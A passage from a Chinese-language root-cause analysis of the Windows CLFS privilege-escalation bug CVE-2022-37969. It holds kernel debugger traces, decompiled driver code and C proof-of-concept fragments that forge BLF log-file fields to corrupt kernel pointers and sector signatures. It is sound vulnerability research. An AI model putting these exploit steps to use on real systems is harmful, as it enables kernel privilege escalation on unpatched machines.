ptr<span style="color:#f92672">[</span>rsp<span style="color:#f92672">+</span>40h<span style="color:#f92672">]</span></span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d0226 4883c420 add rsp,20h</span></span></code></pre></div><p>继续运行，memset已经将该指针的高四位清零</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> p</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted::AllocSymbol<span style="color:#f92672">+</span>0x6c:</span></span><span style="display:flex;"><span>fffff801<span style="color:#960050;background-color:#1e0010">`</span>270d020c 01af28130000 add dword ptr<span style="color:#f92672">[</span>rdi<span style="color:#f92672">+</span>1328h<span style="color:#f92672">]</span>,ebp</span></span><span style="display:flex;"><span>1: kd<span style="color:#f92672">></span> dd ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844d0</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844d0 c1fdf008 00000030 00080000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844e0 00000000 00000000 4bd8b7c0 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f3844f0 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384500 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384510 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384520 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384530 00000000 00000000 00000000 00000000</span></span><span style="display:flex;"><span>ffffbd84<span style="color:#960050;background-color:#1e0010">`</span>4f384540 00000000 00000000 00000000 00000000</span></span></code></pre></div><p>继续运行则触发异常</p><pre tabindex="0"><code>1: kd> k
# Child-SP RetAddr Call Site
00 ffffb807`d4c5f6d8 fffff801`28112c22 nt!DbgBreakPointWithStatus
01 ffffb807`d4c5f6e0 fffff801`28112206 nt!KiBugCheckDebugBreak+0x12
02 ffffb807`d4c5f740 fffff801`27ff89c7 nt!KeBugCheck2+0x946
03 ffffb807`d4c5fe50 fffff801`2800a869 nt!KeBugCheckEx+0x107
04 ffffb807`d4c5fe90 fffff801`28009cbc nt!KiBugCheckDispatch+0x69
05 ffffb807`d4c5ffd0 fffff801`280017af nt!KiSystemServiceHandler+0x7c
06 ffffb807`d4c60010 fffff801`27ee2467 nt!RtlpExecuteHandlerForException+0xf
07 ffffb807`d4c60040 fffff801`27ee1066 nt!RtlDispatchException+0x297
08 ffffb807`d4c60760 fffff801`2800a9ac nt!KiDispatchException+0x186
09 ffffb807`d4c60e20 fffff801`28006b43 nt!KiExceptionDispatch+0x12c
0a ffffb807`d4c61000 fffff801`270cb2d5 nt!KiPageFault+0x443
0b ffffb807`d4c61190 fffff801`27098655 CLFS!CClfsContainer::Close+0xd
0c ffffb807`d4c611c0 fffff801`270987b6 CLFS!CClfsLogFcbPhysical::CloseContainers+0x69
0d ffffb807`d4c611f0 fffff801`27098761 CLFS!CClfsLogFcbPhysical::Finalize+0x42
0e ffffb807`d4c61220 fffff801`270bdf42 CLFS!CClfsLogFcbPhysical::Release+0xb1
0f ffffb807`d4c61280 fffff801`270c0878 CLFS!CClfsRequest::Close+0xd6
10 ffffb807`d4c612d0 fffff801`270c0747 CLFS!ClfsDispatchIoRequest+0x108
11 ffffb807`d4c61320 fffff801`27eabac5 CLFS!CClfsDriver::LogIoDispatch+0x27
12 ffffb807`d4c61350 fffff801`281f088f nt!IofCallDriver+0x55
13 ffffb807`d4c61390 fffff801`28219af0 nt!IopDeleteFile+0x14f
14 ffffb807`d4c61410 fffff801`27eae1a7 nt!ObpRemoveObjectRoutine+0x80
15 ffffb807`d4c61470 fffff801`28222449 nt!ObfDereferenceObjectWithTag+0xc7
16 ffffb807`d4c614b0 fffff801`282e3745 nt!ObCloseHandleTableEntry+0x6c9
17 ffffb807`d4c615f0 fffff801`2828fadd nt!ExSweepHandleTable+0xd5
18 ffffb807`d4c616a0 fffff801`282b6d98 nt!ObKillProcess+0x35
19 ffffb807`d4c616d0 fffff801`282760f6 nt!PspRundownSingleProcess+0x204
1a ffffb807`d4c61760 fffff801`282777f8 nt!PspExitThread+0x5f6
1b ffffb807`d4c61860 fffff801`27eb4d77 nt!KiSchedulerApcTerminate+0x38
1c ffffb807`d4c618a0 fffff801`27ffce90 nt!KiDeliverApc+0x487
1d ffffb807`d4c61950 fffff801`2800a35f nt!KiInitiateUserApc+0x70
1e ffffb807`d4c61a90 00007ffd`40c90994 nt!KiSystemServiceExit+0x9f
1f 0000005f`4e1ffa88 00007ffd`40c42dc7 ntdll!NtWaitForWorkViaWorkerFactory+0x14
20 0000005f`4e1ffa90 00007ffd`40497034 ntdll!TppWorkerThread+0x2f7
21 0000005f`4e1ffd90 00000000`00000000 0x00007ffd`40497034</code></pre><p>到<code>CClfsLogFcbPhysical::CloseContainers</code>查看伪代码可知，通过<code>CClfsBaseFile::AcquireContainerContext</code>函数获取到container context并存在v7变量中，而后将<code>v7→pContainer</code>指针取出，如果该指针不为零则将其传入<code>CClfsContainer::Close</code></p><pre tabindex="0"><code>__int64 __fastcall CClfsLogFcbPhysical::CloseContainers(CClfsLogFcbPhysical *this)
{
int v1; // esi
unsigned int v2; // edi
struct _CLFS_CONTAINER_CONTEXT *v4; // rbp
CClfsContainer *v5; // rcx
struct _CLFS_CONTAINER_CONTEXT *v7; // [rsp+30h] [rbp+8h] BYREF
v7 = 0i64;
v1 = 0;
v2 = *((_DWORD *)this + 341);
if ( v2 >= *((_DWORD *)this + 340) )
return (unsigned int)v1;
while ( 1 )
{
v1 = CClfsBaseFile::AcquireContainerContext(
*((CClfsBaseFile **)this + 85),
*((_DWORD *)this + (v2 &amp; 0x3FF) + 342),
&amp;v7);
if ( v1 &lt; 0 )
break;
v4 = v7;
if ( !v7 )
break;
v5 = (CClfsContainer *)*((_QWORD *)v7 + 3);
if ( v5 )
{
CClfsContainer::Close(v5);
(*(void (__fastcall **)(_QWORD))(**((_QWORD **)v4 + 3) + 8i64))(*((_QWORD *)v4 + 3));
*((_QWORD *)v4 + 3) = 0i64;
}
CClfsBaseFile::ReleaseContainerContext(*((CClfsBaseFile **)this + 85), &amp;v7);
if ( ++v2 >= *((_DWORD *)this + 340) )
return (unsigned int)v1;
}
return 3222929421i64;
}</code></pre><p>由于前面将这个指针的高四位清零，所以传入<code>CClfsContainer::Close</code>函数的指针为0x03</p><pre tabindex="0"><code>1: kd> rrcx
rcx=0000000000000003
1: kd> u
CLFS!CClfsLogFcbPhysical::CloseContainers+0x69:
fffff801`27098655 488b4d18 mov rcx,qword ptr [rbp+18h]
fffff801`27098659 488b01 mov rax,qword ptr [rcx]
fffff801`2709865c 488b4008 mov rax,qword ptr [rax+8]
fffff801`27098660 ff156abf0100 call qword ptr [CLFS!_guard_dispatch_icall_fptr (fffff801`270b45d0)]
fffff801`27098666 4883651800 and qword ptr [rbp+18h],0
fffff801`2709866b 488b8ba8020000 mov rcx,qword ptr [rbx+2A8h]
fffff801`27098672 488d542430 lea rdx,[rsp+30h]
fffff801`27098677 e8cc9d0200 call CLFS!CClfsBaseFile::ReleaseContainerContext (fffff801`270c2448)</code></pre><p>在<code>CClfsContainer::Close</code>函数内对该指针解引用，导致异常</p><pre tabindex="0"><code>CLFS!CClfsContainer::Close:
fffff801`270cb2c8 48895c2408 mov qword ptr [rsp+8], rbx
fffff801`270cb2cd 57 push rdi
fffff801`270cb2ce 4883ec20 sub rsp, 20h
fffff801`270cb2d2 488bd9 mov rbx, rcx
fffff801`270cb2d5 488b4920 mov rcx, qword ptr [rcx+20h]</code></pre><p><strong>第二种方式</strong></p><p>第二种方式是修改<code>cbSymbolZone</code> 为超大的值，使得<code>BaseLogRecord+0x1338+cbSymbolZone</code> 能够到达下一个<code>BaseLogRecord</code>的<code>container context</code>，并利用<code>memset</code>将<code>container_context→pContainer</code>指针的高四位清零。</p><p>在<code>CLFS!CClfsBaseFilePersisted::ReadMetadataBlock</code>断点</p><pre tabindex="0"><code>bp CLFS!CClfsBaseFilePersisted::ReadMetadataBlock</code></pre><p>运行PoC，在<code>ReadMetadataBlock</code>断下</p><pre tabindex="0"><code>1: kd> rrdx
rdx=0000000000007a00
1: kd> k
# Child-SP RetAddr Call Site
00 fffff389`53916f50 fffff806`62d9a395 CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa
01 fffff389`53916ff0 fffff806`62d9a204 CLFS!CClfsBaseFile::AcquireMetadataBlock+0x45
02 fffff389`53917020 fffff806`62d99c36 CLFS!CClfsBaseFilePersisted::ReadImage+0x1e8
03 fffff389`53917080 fffff806`62d62da2 CLFS!CClfsBaseFilePersisted::OpenImage+0x2fa
04 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0x326
05 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef
06 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97
07 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87
08 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27
09 fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55
0a fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34
0b fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d
0c fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe
0d fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa
0e fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f
0f fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79
10 fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25
11 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14
12 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199
1: kd> u
CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa:
fffff806`62d940ba e8a1e02104 call nt!ExAllocatePoolWithTag (fffff806`66fb2160)
fffff806`62d940bf 488bf0 mov rsi,rax
fffff806`62d940c2 4889442438 mov qword ptr [rsp+38h],rax
fffff806`62d940c7 4885c0 test rax,rax</code></pre><p><code>ReadMetadataBlock</code>调用<code>nt!ExAllocatePoolWithTag</code>分配内核堆存储基本记录，调试器中可以看到内存分配在<code>ffffab0523ecf000</code></p><pre tabindex="0"><code>1: kd> p
CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaf:
fffff806`62d940bf 488bf0 mov rsi,rax
1: kd> rrax
rax=ffffab0523ecf000</code></pre><p>在下面两个地方下断点</p><pre tabindex="0"><code>ba w8 ffffab0523ecf000+0x68
ba w8 ffffab0523ecf000+0x200*0xE-0x8</code></pre><p>这两个地方分别是<code>LogBlockHeader→SignatureOffset</code>和第十四个扇区签名的位置(0xc*0x200 + 0x1fe)</p><p>继续运行，在第二个断点断下，调用栈：</p><pre tabindex="0"><code>1: kd> k
# Child-SP RetAddr Call Site
00 fffff389`539170c0 fffff806`62d63672 CLFS!CClfsLogFcbPhysical::ResetLog+0x100
01 fffff389`53917100 fffff806`62d8eaeb CLFS!CClfsLogFcbPhysical::Initialize+0xbf6
02 fffff389`53917240 fffff806`62d90a2b CLFS!CClfsRequest::Create+0x4ef
03 fffff389`53917390 fffff806`62d907f7 CLFS!CClfsRequest::Dispatch+0x97
04 fffff389`539173e0 fffff806`62d90747 CLFS!ClfsDispatchIoRequest+0x87
05 fffff389`53917430 fffff806`668abac5 CLFS!CClfsDriver::LogIoDispatch+0x27
06 fffff389`53917460 fffff806`668629a4 nt!IofCallDriver+0x55
07 fffff389`539174a0 fffff806`66bf1dfd nt!IoCallDriverWithTracing+0x34
08 fffff389`539174f0 fffff806`66c20cbe nt!IopParseDevice+0x117d
09 fffff389`53917660 fffff806`66c01d3a nt!ObpLookupObjectName+0x3fe
0a fffff389`53917830 fffff806`66c88f0f nt!ObOpenObjectByNameEx+0x1fa
0b fffff389`53917960 fffff806`66c88ae9 nt!IopCreateFile+0x40f
0c fffff389`53917a00 fffff806`66a0a2b5 nt!NtCreateFile+0x79
0d fffff389`53917a90 00007ffa`91b0d9e4 nt!KiSystemServiceCopyEnd+0x25
0e 00000058`ec6fe888 00007ffa`8bc92199 ntdll!NtCreateFile+0x14
0f 00000058`ec6fe890 00000000`00000000 0x00007ffa`8bc92199
1: kd> ub
CLFS!CClfsLogFcbPhysical::ResetLog+0xd7:
fffff806`62d7151b 48894140 mov qword ptr [rcx+40h],rax
fffff806`62d7151f 488b83d8010000 mov rax,qword ptr [rbx+1D8h]
fffff806`62d71526 48894148 mov qword ptr [rcx+48h],rax
fffff806`62d7152a 488b83e8010000 mov rax,qword ptr [rbx+1E8h]
fffff806`62d71531 48894150 mov qword ptr [rcx+50h],rax
fffff806`62d71535 488b83f0010000 mov rax,qword ptr [rbx+1F0h]
**fffff806`62d7153c 48894158 mov qword ptr [rcx+58h],rax**
fffff806`62d71540 806178df and byte ptr [rcx+78h],0DFh
1: kd> rrcx
rcx=ffffab0523ed0ba0</code></pre><p>继续运行，rcx+0x58的位置已经被<code>0xFFFFFFFF00000000</code>覆盖了，而<code>rcx+0x5e = ffffab0523ecf000 + 0xd * 0x200 + 0x1FE</code>，也就是rcx+0x5e位于第十四扇区签名处，此时这个签名已经被<code>0xFFFF</code>覆盖了。</p><pre tabindex="0"><code>1: kd> db rcx
ffffab05`23ed0ba0 07 f0 fd c1 88 00 00 00-00 00 00 01 00 00 00 00 ................
ffffab05`23ed0bb0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0bc0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0bd0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0be0 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0bf0 00 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff ................
ffffab05`23ed0c00 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
ffffab05`23ed0c10 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................</code></pre><p>对应伪代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsLogFcbPhysical<span style="color:#f92672">::</span><span style="color:#a6e22e">ResetLog</span>(CClfsLogFcbPhysical<span style="color:#f92672">*</span>this)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_CLIENT_CONTEXT<span style="color:#f92672">*</span>v2;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> .</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((CLFS_LSN<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span>)<span style="color:#f92672">=</span> CLFS_LSN_INVALID;<span style="color:#75715e">// FF FF FF FF 00 00 00 00</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> .....</span></span><span style="display:flex;"><span> v2<span style="color:#f92672">-></span>lsnRestart.Internal<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span>);<span style="color:#75715e">// 58h的偏移</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v2<span style="color:#f92672">-></span>eState<span style="color:#f92672">&amp;=</span><span style="color:#f92672">~</span><span style="color:#ae81ff">0x20u</span>;</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">ReleaseClientContext</span>(<span style="color:#f92672">*</span>((CClfsBaseFile<span style="color:#f92672">**</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">85</span>),<span style="color:#f92672">&amp;</span>v7);</span></span><span style="display:flex;"><span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">ResetContainerQ</span>(</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((CClfsBaseFilePersisted<span style="color:#f92672">**</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">85</span>),</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">342</span>,</span></span><span style="display:flex;"><span> v4,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">340</span>,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">341</span>);</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">IncrementUsn</span>(<span style="color:#f92672">*</span>((CClfsBaseFilePersisted<span style="color:#f92672">**</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">85</span>));</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> (CClfsBaseFilePersisted<span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">85</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">657</span>)<span style="color:#f92672">=</span> v5;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>((_BYTE<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">657</span>)<span style="color:#f92672">=</span> CClfsBaseFilePersisted<span style="color:#f92672">::</span><span style="color:#a6e22e">IncrementUsn</span>(v6);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>现在有三个问题：</p><ul><li>为什么<code>CLIENT_CONTEXT→lsnRestart.Internal</code>会和第十四个扇区签名重叠</li><li>怎么调用到<code>ResetLog</code>函数导致重叠区域被重置为<code>0xFFFF</code></li><li>为什么重叠的是第十四个不是其他</li></ul><p>回到PoC中，首先将BLF文件内偏移0x9A8，这是<code>CLFS_BASE_RECORD_HEADER→rgClients</code> ，该处伪造了假的<code>client context</code>偏移0x1b30</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/5.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> checkSum[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// {0x59, 0xdf, 0x44, 0x06}; // offset 0x80c</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> signaturOffset[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x868</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> ccoffsetArray[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x9a8</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> cbsymbolZone[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x4b</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x1b98</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> blockNameoffset[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xb8</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x2390</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> blockAtributeoffset[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x2394</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#a6e22e">_wfopen_s</span>(<span style="color:#f92672">&amp;</span>pFile, stored_env_open,<span style="color:#e6db74">L</span><span style="color:#e6db74">"r+"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pFile<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"Cant't open file, error %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>,<span style="color:#a6e22e">GetLastError</span>());</span></span><span style="display:flex;"><span><span style="color:#75715e">// getchar();</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[+] file successfully opened</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 校验和</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x80c</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(checkSum,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(checkSum), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Signature 值</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x868</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(signaturOffset,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(signaturOffset), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// client context的偏移</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x9a8</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(ccoffsetArray,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(ccoffsetArray), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// cbsymbolZone偏移，写入恶意的cbsymbolZone</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x1b98</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(cbsymbolZone,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(cbsymbolZone), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x2390</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(blockNameoffset,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(blockNameoffset), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x2394</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(blockAtributeoffset,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(blockAtributeoffset), pFile);</span></span></code></pre></div><p>而后在偏移0x23a0(0x1b30+0x870)处伪造假的client context，伪造的假client context需要有正确的<code>client context</code>头，将原<code>client context</code>复制过去即可。此时<code>client context→lsnRestart.Internal = 0x23a0 + 0x58 = 23f8</code>，位于基本记录的<code>0x1bf8</code>处，第14个扇区的扇区签名位于<code>0xd * 0x200 + 0x1fe=1BFE</code> ，<code>client context→lsnRestart.Internal</code> 大小八个字节，刚好高二位能够覆盖到扇区签名。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> fakeClientcontext[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x88</span> };<span style="color:#75715e">// offset 0x23a0</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> fakeClientcontext2[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x23ab</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">char</span> fakeClientcontext3[]<span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span> };<span style="color:#75715e">// offset 0x2418</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">// Client context，伪造假的Client context头</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x23a0</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(fakeClientcontext,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(fakeClientcontext), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Client context，伪造假的Client context头</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x23ab</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(fakeClientcontext2,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(fakeClientcontext2), pFile);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Client context，伪造假的值，使得程序进入ResetLog</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">fseek</span>(pFile,<span style="color:#ae81ff">0x2418</span>, SEEK_SET);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fwrite</span>(fakeClientcontext3,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>),<span style="color:#66d9ef">sizeof</span>(fakeClientcontext3), pFile);</span></span></code></pre></div><p>而ResetLog中要覆盖八个字节，刚好将第十四个扇区签名覆盖为0xFFFF</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> v2<span style="color:#f92672">-></span>lsnRestart.Internal<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)this<span style="color:#f92672">+</span><span style="color:#ae81ff">62</span>);<span style="color:#75715e">// 58h的偏移</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> 